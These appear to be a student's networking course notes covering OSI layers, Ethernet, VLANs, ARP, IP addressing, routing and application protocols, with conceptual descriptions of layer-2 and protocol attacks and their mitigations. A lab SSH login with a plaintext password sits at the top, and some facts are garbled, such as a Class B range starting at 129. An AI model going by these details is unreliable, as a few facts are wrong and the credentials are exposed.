 ## Day 1 networking

    https://net.cybbh.io/public/networking/latest/index.html
    https://miro.com/app/board/o9J_klSqCSY=/
    http://networking-ctfd-2.server.vta:8000/
    Blue internet host ssh student@10.50.31.246 -X
    student12

## Network Access
    https://net.cybbh.io/public/networking/latest/01_data/fg.html

   ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/efa0e451-c213-41c0-8cde-cf634f396ed3)

    PROTOCOL DATA UNIT (PDU)

    session-application = data
    transport = segment/datagram
    network = packet
    data link = frame
    physical = bit 
    
     7 - Application
     Data
     DNS, HTTP, TELNET
     
     6 - Presentation
     Data
     SSL, TLS, JPEG, GIF
     
     5 - Session
     Data
     NetBIOS, PPTP, RPC, NFS
     
     4 - Transport
     Segment/Datagram
     TCP, UDP
     
     3 - Network
     Packet
     IP, ICMP, IGMP
     
     2 - Data Link
     Frames
     PPP, ATM, 802.2/3 Ethernet, Frame Relay
     
     1 - Physical
     Bits
     Bluetooth, USB, 802.11 (Wi-Fi), DSL, 1000Base-T

   ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/c61a97af-d2df-4293-9e06-df13186de45b)

    Bit Time - is the period of time is required for a bit to be placed and sensed on the media. Network speeds are measured by how many bits can be placed or sensed on the media in 1 second. Each increase in speed requires more bits to be sent during the same 1 second internal. To accomplish this the bit-times are reduced.

    Speed	Bit-time
    10 Mbps  100ns
    100 Mbps  10ns
    1 Gbps  1ns
    10 Gbps  .1ns
    100 Gbps  .01ns


       Ethernet
    
    IEEE 802.3, 802.3u, 802.3z, 802.3ae, 802.3de
    
    Low cost
    Easy to install maintain and troubleshoot
    Fast and consistent data transfer speed
    
    Does not prioritize traffic for QoS
    Cabling infrastructure required

 ## Data Link Sub-Layers

       Media Access Control (MAC): IP to MAC

    The MAC sub-layer is responsible for controlling access to the physical transmission medium.
    Handles the transmission and reception of data frames over the physical medium, including addressing, framing, and error checking.
    Act as a sublayer governing protocol access to the physical medium, physical addressing, and acts as an interface between the LLC and physical layer. Most of the frame construction happens at this layer.
     Provides the destination MAC address.
         Either a broadcast (FF:FF:FF:FF:FF:FF) to address all nodes on LAN.
         Unicast MAC (4A:30:10:19:10:1A) to address one node on LAN.
         Multicast MAC (01:00:5E:00:00:C8) to address a group of nodes on a LAN. Will have a Multicast address as the destination IP.
     Provides the source MAC address.
         Always a Unicast MAC.
     Calculates the Cyclic Redundancy Check (CRC) on the Frame and appends to the Frame Check Sequence (FCS) field.
     Controls access to/from the medium.
         Sending bit-rate (bit speed)
         Duplex (Half or Full) and CSMA/CD functions
         Frame delimiting and recognition


         Logical Link Control (LLC): Mac to IP

    The LLC sub-layer is responsible for establishing, maintaining, and terminating logical links between network devices.
    Provides services such as error detection and flow control to ensure reliable data transmission over the physical medium.
    LLC defines the framing and addressing mechanism for data frames and handles the multiplexing of network layer protocols.
    It acts as an interface between the Network Layer (Layer 3) and the MAC sub-layer, enabling communication between the two layers regardless of the underlying physical media.
    Manages communication between devices over a single link of the network that includes error checking and data flow.
    Multiplexes protocols to be sent over the MAC sub-layer.
    Follows the IEEE 802.2 standard.
    This layer provides the Ethertype to the MAC sublayer in the frame construction to identify the encapsulated protocol.
      0x0800 for IPv4
      0x0806 for ARP
      0x86dd for IPv6
      0x8100 for 802.1q VLAN tag


  ## Message Formatting Method and Terminology

      Header - The header contains information related to control and communication processes between different protocol elements for different devices. This typically consists of information such as the source and destination address, clock information for transmission synchronization, and alert signals to indicate a packet is being transmitted.

    Data - This is the actual data being transmitted which contains the payload. This payload may include another higher level message that consists of the same elements. For example, the data may contain information used to setup a logical connection before data is sent.
    
    Footer - Commonly referred to as the trailer. The contents vary between communication methods or protocols. Usually the cyclical redundancy check (CRC) error-checking component is placed here. This is not always required for each protocol, but is especially important at the data-link layer.


 ## Encapsulation and Decapsulation

     The communication between every layer other than the Physical layer is logical in nature. Therefore in order to pass information between protocol layers a protocol data unit (PDU) must be used. Each PDU for each protocol layer has specifications for the features or requirements at its layer. The PDU is passed down to a lower layer for transmission, the next lower layer is providing the service of handling the previous layer’s PDU. This is why the previous layer’s PDU is now referred to as an service data unit (SDU).

## Switch Operation 1.3.3

    switching modes - 

    Store-and-Forward accepts and analyzes the entire frame before forwarding it to its destination. It takes more time to examine the entire frame, but it allows the switch to catch certain frame errors and collisions and keep them from propagating bad frames through the network. This method is required to switch frames between links of different speeds; this is due to bit-timing. The speed at which the bits enter one interface may be slower than the speed at which the switch needs to send the bits to a different interface. ** evaluates entire frame, checks FCS, checks entirety of the frame, if it passes checks, it forwards frame **

    Cut-Through (sometimes called fast forward) only examines the destination address before forwarding it to its destination segment. This is the fastest switching mode but requires the interfaces to be the same speed.

    Fragment-Free read at least 64 bytes of the Ethernet frame before switching it to avoid forwarding Ethernet runt frames (Ethernet frames smaller than 64 bytes). A frame should have a minimum of 46 bytes of payload plus its 18-byte frame header. ** makes sure frame itsself has the correct amount of bytes, then sends it ** 
    
    
## 1.3.3.1 CAM Table Overflow/Media Access Control (MAC) Attack

    A CAM (Content Addressable Memory) table overflow attack, also known as a MAC (Media Access Control) flooding attack, is a type of security exploit that targets network switches. This attack aims to overwhelm a switch’s CAM table, which is used to store MAC address-to-port mappings, leading to a denial of service (DoS) condition or facilitating a man-in-the-middle attack.

    - send frames with bogus source MAC address to switch
    - causes switch to fill table with bogus addresses
    - switch will not be able to learn new (valid) MAC addresses.

    **mitigate Cam overflow attack **
    switch(config)# interface fa0/10
    switch(config-if)# switchport port security
    switch(config-if)# switchport port security maximum 1
    switch(config-if)# switchport port security violation shutdown

 ## Describing MAC addressing
     
![image](https://github.com/robertjenkins2828/Networking/assets/163066736/694d62a5-9f3c-497e-ace1-871ba8e8edea)


     Length: 48-bit | 6 byte | 12 hex
     Format:
      - Windows: 01-23-45-12-34-56
      - unix/linux: 01:23:45:12:34:56
      - cisco: 1234.5612.3456
     Parts:
      OUI- First 24 bits assigned by IANA (first 3 bytes)
      Vendor Assigned - last 24-bits assigned by vendor (last 3 bytes)

      Mac address Types:
      unicast: one to one
       8th bit is off
      Multicast: one to many
       8th bit is on
      Broadcast: one to all
       all bits on

   ## MAC Spoofing

      Could not be changed at first
      used to be called:
       hardware
       firmware
       burned-in
      now macs can be changed w/ software

  ## 1.3.5 Analyze 802.3 frame headers

  ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/ed17ceaf-e0ab-4acc-b98b-d08c934330c2)


  ## 1.3.7 Describe an 802.1Q virtual local area network (VLAN) frame and how its frames differ from a standard 802.3 frame
     
  ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/d032ce51-32c7-47a8-b77f-4e345282b232)


 ## VLAN Types

    Default - VLAN 1
    data - user traffic
    voice - VOIP traffic
    management - switch and router management
    native - untagged switch and router traffic

  ## 1.3.7.4 Describe an 802.1AD Double Tagging VLANs


  ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/54fa08f7-94e2-4b12-8e2b-a9a882bae0d1)

     Double header if you have a VLAN on your private network (so two VLANs don't interfere with each other)
     "0x88A8" is the double dagged VLAN header

   ## 1.3.7.5 Describe VLANS and Security vulnerabilities

      VLAN hopping attack - VLAN hopping is an exploit method of attacking networked devices on separate virtual LAN (VLAN) without traversing a router or other Layer 3 device. The concept behind VLAN hopping attacks is for the attacker on one VLAN to gain access to traffic on other VLANs that would normally not be accessible. Keep in mind that VLAN hopping is typically a one-way attack. It will not be possible to get any response from the target device unless methods are setup on the target to respond with similar vlan hopping methods.

  ## 1.3.8 Describe the address resolution protocol (ARP)

     The Address Resolution Protocol (ARP) is a networking protocol used to map an IP address to a MAC address within a local network segment. ARP operates at the Data Link Layer (Layer 2) of the OSI model and is essential for communication between devices on the same network.
     
  ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/9dcadc63-05fd-4269-8818-5a0fb2fcae36)


     ARP Types - 1 = request, 2 = reply, 3 = RARP request, 4 = RARP reply
     ARP (OP 1 and 2)
     RARP (OP 3 and 4)
     Proxy ARP (OP 2)
     Gratuitous ARP (OP 2)

    Proxy ARP - A device (router) answers the ARP queries for IP address that is on a different network.
    Gratuitous ARP - An ARP reply that was not requested.

    ARP Cache - is a collection of Layer 2 to Layer 3 address mappings discovered utilizing the ARP request/response process. When a host needs to send a packet both the L2 and L3 addresses are needed. The host will look in this table to determine if it already knows both the L2 and L3 addresses. If the target is not in the table then a ARP request is initiated. The ARP cache can be populated statically but mostly its done dynamically. This cache can be exploited by attackers with the aim to poison the cache with incorrect information to either perform a DoS or MitM.

    MITM WITH ARP

    Poison ARP cache with:
      - gratuitous ARP
      - proxy ARP

   ## 1.3.10 Explain VTP with its vulnerabilities

   ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/9172396f-5613-471e-80db-322529074ede)

    VLAN Trunking Protocol (VTP) is a Cisco proprietary protocol that propagates the definition of Virtual Local Area Networks (VLAN) on the whole local area network. VLAN Trunk Protocol (VTP) was developed to help reduce the administration of creating VLANs on all switches within a switched network. To do this, VTP sends VLAN information to all the switches in a VTP domain.

    VTP modes = server & client
    VTP vulnerability 
    - can cause switches to dump all VLAN information
    - cause a DoS as switch will not support configured VLANS

 ## DTP with vulnerabilities

    The Dynamic Trunking Protocol (DTP) is a Cisco proprietary Layer 2 protocol. Its purpose is to dynamically negotiate trunking on a link between two switches running VLANS. It can also negotiate the type of trunking protocol to be used on the link (802.1q or ISL). DTP works by exchanging small DTP frames between two supporting devices to negotiate the link parameters.

  ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/88f2cb43-369b-4444-b6a8-15070c003537)

    vulnerabilities
    - on by default
    - can send crafted messages to form a VLAN trunk link
    - recommend to:
     disable DTP negotiations
     manually assign as access or trunk

  ## CDP, FDP, and LLDP

     Cisco Discovery Protocol (CDP) is a Layer 2, Cisco proprietary protocol used to share information with other directly connected Cisco devices. CDP is protocol and media independent and runs on all Cisco routers, switches, and other devices.

    CDP Shares information such as:
      Type of device
      Hostname
      Number and type of interface
      IP address
      IOS software version

      Foundry discovery protocol (FDP)
      Link Layer Discovery Protocol (LLDP)


      vulnerabilities 
       - leaks valuable information
       - clear text
       - enabled by default 
       - disable it:
         - globally
         - per interface
         * may require it for voice *
         


 ## 1.3.13 Explain STP with its vulnerabilities
![image](https://github.com/robertjenkins2828/Networking/assets/163066736/e65da86a-1183-45bd-9c51-101d1ce38113)

    STP is a Layer 2 protocol that builds a loop-free logical topology for Ethernet networks in a network that physically has loops. The basic function of STP is to prevent switching loops and the broadcast storms that can result. Spanning tree allows a network design to include physical "backup links" to provide fault tolerance if the active link fails.

## 1.3.14 Explain Port Security with its vulnerabilities

    The purpose of configuring port security technologies is to limit, restrict, and protect network access. Configuring port security can be done on active access ports to limit the number of users or MAC addresses allowed to access onto the network. This will help to alleviate attacks such as DoS, MAC Address Flooding, and most unauthorized access.

    port security modes
     protect - Drops any frames with an unknown source addresses.
     restrict - Same as protect except it additionally creates a violation counter report.
     shutdown - Places the interface into an "error-disabled" state immediately and sends an SNMP trap notification. This is typically the default mode.

     port security can help to
      - restrict unauthorized access
      - limit mac address learned on port
      - prevent cam table overflow attacks

    port security vulnerabilities:
     - dependant on MAC address
     - MAC spoofing

  ## 1.3.15 Layer 2 Attack mitigation techniques

     -shutdown unused ports
     - enable port security
     - IP source guard
     - manually assign STP root
     - BPDU guard
     - DHCP snoopinng
      Static CAM entries - Static CAM (Content Addressable Memory) entries refer to manually configured entries in the CAM table of Ethernet switches. These entries map specific MAC addresses to specific switch ports and are used to optimize network performance and facilitate specific network configurations.
      Static ARP entries - Static ARP (Address Resolution Protocol) entries are manually configured mappings between IP addresses and MAC addresses in the ARP table of network devices. These entries are used to ensure stable communication between specific devices on the network.

  ## DESCRIBE IP NETWORKING

      Network layer 
       - addressing schemes for network (logical addressing)
       - routing
       - encapsulation
       - IP fragmentation and reassembly
       - error handling and diagnostics

       internet protocol versions
       IPV4 (ARPANET 1982)
        - classful subnetting
        - classless subnetting (CIDR)
        - NAT
        - ipv6 standardized 2017

        Class A(0-127)
        Class B(129-191)
        Class C(192-223)
        Class D(224-239) - multicasting
        Class E(240-255) not used

        
## 2.1.1.2 Analyze IPv4 packet header
https://net.cybbh.io/public/networking/latest/02_network/fg.html
![image](https://github.com/robertjenkins2828/Networking/assets/163066736/254bca6a-0c51-4974-aae5-572a8098e6ca)

## IPV4 ADDRESS SCOPES

     - Public
     - private
     - loopback (127.0.0..0/8)
     - link-local (APIPA)
     - multicast (class D)

## 2.1.1.4 Explain Fragmentation with it’s vulnerability

    breaking up packets from higher MTU to lower MTU network
    - performed by routers
    - MF flag is on from 1st until 2nd to last
    - offset is on from 2nd until the last
    - offset = (MTU-(IHLx4)) / 8       ** fragment offset **
    
## IPv6 Fragmentation

    - ipv6 does not support fragmentation within its header
    - routers do not fragment ipv6 packets
    - source adjusts mtu to avoid fragmentation
    - source can use ipv6 fragmentation extension header

## fragmentation vulnerabilities

    - 

## OS fingerprinting with TTL
![image](https://github.com/robertjenkins2828/Networking/assets/163066736/fa1af698-b7e3-49b0-8e83-bbc9b871cdf9)

## 2.1.1.6 Explain IPv4 Auto Configuration with vulnerability

    vulnerabilities - 
      - rogue DHCP
      - evil twin
      - DHCP starvation
      
## 2.1.1.7 Analyze ICMPv4 protocol and header structure
![image](https://github.com/robertjenkins2828/Networking/assets/163066736/cbe2de12-253a-42de-a8b5-f059aab643cc)

    icmpv4 os fingerprinting
     linux - 
      default size: 64 byes
      payload message: !\”#\$%&\‘()*+,-./01234567
     Windows - 
      Default size: 48 bytes (16 byte ICMP header + 32 byte payload)
      Payload message: abcdefghijklmnopqrstuvwabcdefghi

      ICMP
      - identifies hops between the source and destination
      - uses incrementing TTLs
      - hops return an icmp type 11 time exceeded message when TTL reaches 0
      - continues until it reaches target or 30 hops

      ICMPV4 traceroute
      - can use various protocols and ports
       - icmp (windows default)
       - udp (linux default)
       - tcp

       ICMPv4 attacks
        - firewalking (traceroute)
        - oversized ICMP messages
        - ICMP redirects
        - SMURF attack
        - map network w/ ip unreachables
        - ICMP covert channels: Many networks allow ICMP traffic in and out of their networks. Malicious actors can disguise communication channels as ICMP traffic. This traffic will have typical ICMP headers but the payload will greatly vary depending on the type of traffic encapsulated.

 ## 2.1.2 Explain IPv6 Addressing

        128 bit addresses
        64-bit prefix (4 hextets)
        64-bit interface ID (4 hextets)
        340 undecillian addresses

        - organizations assigned a 48-bit prefix by IANA
        - last 16 bits of prefix used for subnetting
        
        
 ## IPV6 PACKET HEADER
 ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/042375b1-3c2e-497a-bee4-f0124fb8d3ab)

        ipv6 address types:
          -unicast
          -multicast
          -anycast

          ipv6 address scopes:
          - global unicast addresses (2000::/3)
          - unique local (fc00::/7)
          - loopback (::1/128)

          ipv6 zero configuration (link-local)
          hosts generate link-local prefix (FE80::/8)
          interface id can be 
           - random (windows default)
           - EUI64 (nix and cisco default)
           hosts requests global prefix 
           - SLAAC (RFC 4862) (default)
           - dhcpv6 (configured)


 ## 2.1.2.8 Explain Neighbor Discovery Protocol (NDP)

      - router solicitation (type 133)
      - router advertisement (type 134)
      - neighbor solicitation (type 135)
      - neighbor advertisement (type 136)
      - redirect (type 137)

 ## 2.2 Analyze Internetwork Routing
 ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/f89b400c-4c78-4b6f-ada8-cb58b48edbd5)

       
## 2.2.1 Discuss Routing Tables
![image](https://github.com/robertjenkins2828/Networking/assets/163066736/30b86da4-40e1-4386-8dad-298b0d2bc98e)
![image](https://github.com/robertjenkins2828/Networking/assets/163066736/a6269876-d340-48ce-9928-fc96fc67187a)

        Metrics:
        - rip: hop
        - EIGRP: bandwidth, delay, load, reliability
        - OSPF: cost
        - BGP: policy

 ## 2.2.2.1 Classful vs Classless
![image](https://github.com/robertjenkins2828/Networking/assets/163066736/fc1d1db0-f803-4b73-848a-41e129ab57b7)

       Classful routing protocols (RIPv1 and IGRP) do not send subnet mask information with their routing updates.
       Classless routing protocols (RIPv2, EIGRP, OSPF, and IS-IS) support VLSM and CIDR which include the subnet mask information in their routing updates; classful protocols do not.
       IPv6 routing protocols are all considered classless.

  ## Routed vs. Routing protocols
  ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/179cee50-becb-401f-8b72-7c65cce1fb9e)

       Routed protocols allows data to be routed. These protocols provide an addressing scheme and sub-netting. The addressing scheme identifies the individual host and the network to which it belongs. Each host address must be unique. All hosts on an internetwork must use the services of a routed protocol to communicate.
       ex: ipv4, ipv6 etc.

       Routing Protocols are used by routers to communicate routing information with each other. Unless all routes are manually entered into the router, the router needs to learn from other routers about the networks that they know. They use this shared information to populate their routing tables so that they can make better decisions when forwarding routed protocols such as IPv4.
       ex:
       
       interior Gateway Protocol (IGP) - is a type of protocol used for exchanging routing information between gateways (commonly routers) within an autonomous system
       such as: RIP, EIGRP, OSPF, IS-IS

       Exterior Gateway Protocol (EGP) - is a routing protocol used to exchange routing information between autonomous systems - BGP
       
## 2.2.2.3 IGP vs EGP
        Interior Gateway Protocols (IGP):
        Routing protocols that are used within an Autonomous System (AS).
          Referred to as intra-AS routing.
          Organizations and service providers IGPs on their internal networks.
          IGPs include RIP, EIGRP, OSPF, and IS-IS.

          Exterior Gateway Protocols (EGP):
           Used primarily for routing between autonomous systems.
           Referred to as inter-AS routing.
           Service providers and large companies will interconnect their AS using an EGP.
           The Border Gateway Protocol (BGP) is the only currently viable EGP and is the official routing protocol used by the Internet.


## 2.2.2.4 Autonomous Systems
         collection of connected internet protocol routing prefixes under the control of one or more network operators on behalf of a single administrative entity or domain, that presents a common and clearly defined routing policy to the internet.


## 2.2.2.5 Distance Vector Routing Protocols
![image](https://github.com/robertjenkins2828/Networking/assets/163066736/aa1df7be-c753-4247-bf16-2f3cf2e62d87)

     Distance: This identifies how far away the destination network is from the router and is based on a metric such as the hop count, cost, bandwidth, delay, and more. It takes the learned distance from their neighbor, adds the distance to their neighbor, and this gives them a total distance.
     Vector: This specifies the direction to the remote network. The router advertises a path that it has learned which allows access to a remote network via one of its interfaces.
     RIP and EIGRP are distance vector routing protocols.

## link state routing protocols

    Link state routing protocols tend to flood the network with Link State Advertisements (LSAs). Each router receives these updates and begins to build a map of the entire network. It will use its algorithms to compute the best routes from this map to all remote networks. After this is done no periodic updates are sent unless there is a change in the topology.
    OSPF and IS-IS are link state

  ## 2.2.3.1 Static Routing
  ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/e1ebb4cd-1a91-473f-ab38-cf737d97d1de)

       Static routing provides some advantages over dynamic routing, including:
    Static routes do not advertise over the network, resulting in better security.
    Static routes do not use bandwidth like dynamic routing protocols to send updates and no CPU cycles are used to calculate and communicate routes.
    The path a static route uses to send data is predetermined.

    Static routing has the following disadvantages:
    Initial configuration and maintenance is time-consuming.
    Configuration is prone to error, especially on large networks.
    Administrator must intervene to update routing information or to bypass network faults.
    Does not scale well with growing networks; maintenance becomes cumbersome.
    Requires complete knowledge of the whole network for proper implementation.

  ## 2.2.3.2 Dynamic Routing
  ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/01b29d54-e5b2-4c13-84e5-ab722be7883e)


     Routing protocols allow routers to dynamically exchange routing information to build routing tables. If 2 or more routers share the same protocol they can communicate with each other. The purpose of dynamic routing protocols includes:

     Discover new remote networks
     Maintaining current routing information
     Choose best path to remote networks
     Recalculate a new path to a remote network should the primary fail

    Dynamic routing provides some advantages over static routing, including:
    Easier to configure and maintain.
    Administrator does not need to intervene to update tables during network outages.
    Scales very well on growing networks.

     Dynamic routing has the following disadvantages:
    Routing protocols flood the network updates which consumes bandwidth and can be intercepted.
    Uses extensive CPU and RAM to run its algorithms and build its databases.
    Path data can travel is not deterministic and can change fluidly.

## 2.2.4 Understand First Hop Redundancy Protocols and their vulnerabilities
![image](https://github.com/robertjenkins2828/Networking/assets/163066736/1e29ffc9-2f24-48df-9cc3-02f08ca1cafa)


      Hot Standby Router Protocol (HSRP)

    A Cisco-proprietary FHRP designed to allow for transparent fail-over of IPv4 networks.
    One router interface will be set as "active" and the others set as "standby".
    Once the active interface will forward traffic to other networks.
    Standby interfaces serve as backups in case the active fails.
    Active interface sends multicast "Hello" packets to inform the backups that its still operational.

    Virtual Router Redundancy Protocol version 2 (VRRPv2)

    An industry-standard protocol defined in RFC 3768 that offers similar functionality to HSRP.
    Like HSRP, VRRP allows multiple routers to work together to provide redundancy for the default gateway.
    One router is elected as the master router, and the others are backup routers.
    The master router sends periodic advertisements to inform the backup routers of its status.
    If the master router fails, one of the backup routers is elected as the new master.


    Gateway Load Balancing Protocol (GLBP)

    GLBP is another Cisco proprietary protocol that extends the functionality of HSRP and VRRP by providing load balancing in addition to redundancy.
    GLBP allows multiple routers to share the traffic load for a virtual IP address, providing both redundancy and increased network capacity.
    GLBP uses an active virtual gateway (AVG) to assign different virtual MAC addresses to different routers, distributing traffic across multiple gateways.


    HSRP Attack:

    Routers must exchange HSRP hello packets at the default interval of three seconds. Packets are sent using the multicast address of 224.0.0.2 (the "all routers" IPv4 multicast address). Since multicasts are flooded over the network similar to Broadcasts, they can be intercepted by any host with layer two connectivity and can inspect the HSRP parameters.
    To usurp the active router, the attacker only needs to inject false HSRP hellos claiming the active role with a higher priority.


## Transport layer protocols
https://net.cybbh.io/public/networking/latest/03_transport/fg.html

    Connection-oriented
     - TCP segments
     - unicast traffic
    Connectionless
     - udp datagrams
     - broadcast, multicast, or unicast traffic

     Port ranges 
     0-1023 well-known 
     1024-49151 registered
     49152-65535 dynamic (private)

     TCP reliability

     1. connection establishment
      1. 3 way handshake
     2. data transfer
      1. established phase
     3. connection termination
      1. 4 way termination
      2. reset connection
     
 ## 3.1.4.1 TCP Headers
![image](https://github.com/robertjenkins2828/Networking/assets/163066736/01941c9f-3511-44e0-bf19-e91fe82449dd)

    TCP OPTIONS
    0 - End of Options
    1 - No Options (NOP)
    2 - Maximum Segment Size (MSS)
    3 - TCP Windows Scaling
    4 - Selective ACK (SACK) Permitted
    5 - SACK
    8 - TCP Timestamps

 ## UDP headers
 ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/bc90bcc0-7bbb-4ced-a356-ca03d1875d71)

## 3.2 Explain OSI Layer 5 protocols and headers

     Layer Two Tunneling Protocol (L2TP) serves as an extension of the Point-to-Point Tunneling Protocol (PPTP) commonly employed by internet service providers (ISPs) to establish virtual private networks (VPNs). The primary objective of L2TP is to enable secure data transmission through the creation of tunnels. To uphold security and privacy standards, L2TP necessitates the use of an encryption protocol within the established tunnel.
![image](https://github.com/robertjenkins2828/Networking/assets/163066736/ec58b169-9a62-44f1-a64c-53b46a15a5fd)

      3.2.1.2 PPTP (TCP 1723
 ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/becff92c-e589-4fd2-8d6c-0e1c39a7eb6a)

     3.2.1.3 IP Security (IPSec)
     IPsec (Internet Protocol Security) is a suite of protocols used to secure IP communications by providing encryption, authentication, and integrity protection at the network layer (Layer 3) of the OSI model. It is widely used to establish Virtual Private Networks (VPNs) and secure data transmission over IP networks, including the internet.
     
     modes: transport or tunnel
     Headers: 
       - ESP (protocol 50)
       - AH (protocol 51)
       - IKE (udp port 500 or 4500)

  ## 3.2.1.4 OpenVPN
     open source
     uses openSSL for encryption
     Default UDP port 1194

## 3.2.2.1 Examine SOCKS protocol
![image](https://github.com/robertjenkins2828/Networking/assets/163066736/69c993f8-f683-47c7-91e0-e0eb9915e654)

    RFC 1928
    - uses various client / server exchange messages 
    - client can provide authentication to server
    - client can request connections from server

    SOCKS4
    - no authentication
    - only ipv4
    - no udp support
    - no proxy binding. client's ip is not relayed to destination

    SOCKS5
    - various methods of authentication
    - ipv4 and ipv6 support
    - udp support
    - supports proxy binding. client's ip is relayed to destination

    network basic input outut system (netbios) protocol
     - tcp 139 and udp 137/138
     - name resolution (15 characters)
     - largely replaced by DNS

## SMB/CIFS (TCP 445)
![image](https://github.com/robertjenkins2828/Networking/assets/163066736/01716759-bee7-47ac-a950-8dcf45cdf138)


    SMB rides over netbios
    - netbios dgram service -UDP 138
    - netbios session service -TCP 139
    - SAMBA and CIFS are just flavors of SMB

## 3.2.5 Examine Remote Procedure Call (RPC) Protocol

     Allows a program to execute a request on a local/remote computer
     Hides network complexities
     XML, JSON, SOAP, and gRPC
     User application will:
     Request for information from external server
     Receives the information from the external server
     Display collected data to User

## 3.2.6 Application Programming Interface (API)

        Framework of rules and protocols for software components to interact.
        Methods, parameters, and data formats for requests and responses.
        REST and SOAP

 ## 3.3 Explain OSI Layer 6 functions and responsibilities

    Translation
    Formating
    Encoding (ASCII, EBCDIC, HEX, BASE64)
    Encryption (Symmetric or Asymmetric)
    Compression


## 3.4 Explain OSI Layer 7 protocols and headers

  Telnet (TCP 23)
  ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/abcb3410-e725-4ee9-8e62-962b2c2bdcac)

       - remote login
       - authentication
       - clear text
       - credentials susceptible to interception

   SSH (TCP 22)
   ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/0b9c8ffe-d635-4410-93c8-5a3f67494e7a)

         Messages provide:
       Client/server authentication
       Asymmetric or PKI for key exchange
       Symmetric for session
       User authentication
       Data stream channeling

       User Key - Asymmetric public key used to identify the user to the server

       Host Key - Asymmetric public key used to identify the server to the user

       Session Key - Symmetric key created by the client and server to protect the session’s communication.

       Known-Hosts Database

      ~/.ssh/known_hosts
      Configuration Files
      
      /etc/ssh/ssh_config
      /etc/ssh/sshd_config

      To view the current configured SSH port
      cat /etc/ssh/sshd_config | grep Port
      
      Edit file to change the SSH Port
      sudo nano /etc/ssh/sshd_config
      
      Restart the SSH Service
      systemctl restart ssh


 ## 3.4.3 Analyze Hypertext Transfer Protocol (Secure) (HTTP(s))
 ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/5ac9b1e4-b04d-4d1e-8386-9936837f1d1b)

       HTTP(S) (TCP 80/443)
       User Request methods
           GET / HEAD / POST / PUT
       Server response Codes
           100, 200, 300, 400, 500

           HTTPS Vulnerabilities
           - flooding
           - amplification
           - low and slow
           - drive by downloads
           -BeEF Framework

## 3.4.4 Analyze Domain Name System (DNS) protocol
![image](https://github.com/robertjenkins2828/Networking/assets/163066736/4bc271f0-bc0c-4014-a999-a775ada19d44)


    DNS (TCP/UDP 53)
    DNS QUERY/RESPONSE
    Resolves Names to IP addresses
    Queries and responses use UDP
    DNS response larger than 512 bytes use TCP
    DNS Zone Transfer
    DNS Security

    DNS RECORDS
    A - IPv4 record
    AAAA - IPv6 record
    MX - Mail Server record
    TXT - Human-readable text
    NS - Name Server record
    SOA - Start of Authority

## 3.4.4.3 Explain DNS architecture
![image](https://github.com/robertjenkins2828/Networking/assets/163066736/f197c6e3-af3a-484e-b3d2-2c9ceee38799)


##3.4.5 Analyze File Transfer Protocol (FTP)
![image](https://github.com/robertjenkins2828/Networking/assets/163066736/7348922d-cbcd-41ea-bf05-2169c446bdbc)

     FTP (TCP 20/21)
     RFC 959
     Port 21 open for Control
     Port 20 only open during data transfer
     
     Authentication or Anonymous
     Clear Text
     Modes:
       Active (default)
       Passive

       FTP ACTIVE ISSUES
       NAT and Firewall traversal issues
       Complications with tunneling through SSH
       Passive FTP solves issues related to Active mode and is most often used in modern systems

## 3.4.6 Analyze Trivial File Transfer Protocol (TFTP)
![image](https://github.com/robertjenkins2828/Networking/assets/163066736/387051da-cf2a-43e4-b163-cfdd95c5a33a)

      TFTP (UDP 69)
      Reliability provided at Application layer
      Used by routers and switched to transfer IOS and config files

## 3.4.7 Analyze Simple Mail Transfer Protocol (SMTP)
![image](https://github.com/robertjenkins2828/Networking/assets/163066736/c4cf4483-7570-4ba6-a1f6-4a5f38ff5198)

      SMTP (TCP 25)
      Used to send email
       No encryption
       SMTP over TLS/SSL (SMTPS)
       TCP Ports 587 and 465

## 3.4.8 Analyze  Post Office Protocol (POP)
![image](https://github.com/robertjenkins2828/Networking/assets/163066736/fcb3a5eb-3cd5-4e24-8914-21e045ddb5e6)

      Receives email
      No sync with server
      No encryption
      POP3

## 3.4.9 Analyze Internet Message Access Protocol (IMAP)
![image](https://github.com/robertjenkins2828/Networking/assets/163066736/e5774145-cbb0-44ed-b6e9-89c0740a27ec)

          Receives email
          Sync with server
          No encryption
          IMAP4

## 3.4.10 Analyze Dynamic Host Configuration Protocol (DHCP) version 4 and 6 protocol
![image](https://github.com/robertjenkins2828/Networking/assets/163066736/06c274b4-9b0c-4a32-bad5-daa9e7b7ff1e)

       DHCPV4
          DORA
          
          Discover (Broadcast)
          Offer (Unicast)
          Request (Broadcast)
          Acknowlege (Unicast)


        DHCPV6
          If Managed flag is set during SLAAC:
          Solicit (Multicast)
          Advertise (Unicast)
          Request or Information Request (Multicast)
          Reply (Unicast)

          DHCP VULNERABILITIES
          Rogue DHCP
          Evil Twin
          DHCP Starvation

 ## 3.4.11 Analyze Network Time Protocol (NTP) and vulnerability
 ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/1775cd61-fcaf-48b4-8aac-4422cb2c8fa0)

          NTP (UDP 123)
          Stratum 0 - authoritative time source
          Up to Stratum 15
          Vulnerable to crafted packet injection

 ## 3.4.12 Analyze Terminal Access Controller Access-Control System Plus (TACACS+) Protocol
 ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/d5fad79e-0967-48f3-8647-115af5777829)
 ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/e3191ba2-52ff-41fd-b4c7-be51775c8a77)

            TACACS (TCP 49) SIMPLE/EXTENDED
            The Terminal Access Controller Access-Control System Plus (TACACS+) is a network security protocol used for centralized authentication, authorization, and accounting (AAA) services in network devices such as routers, switches, and firewalls. Developed by Cisco Systems, TACACS+ provides a robust framework for controlling access to network resources and enforcing security policies.

 ## 3.4.13 Analyze Remote Authentication Dial-In User Service (RADIUS) protocol
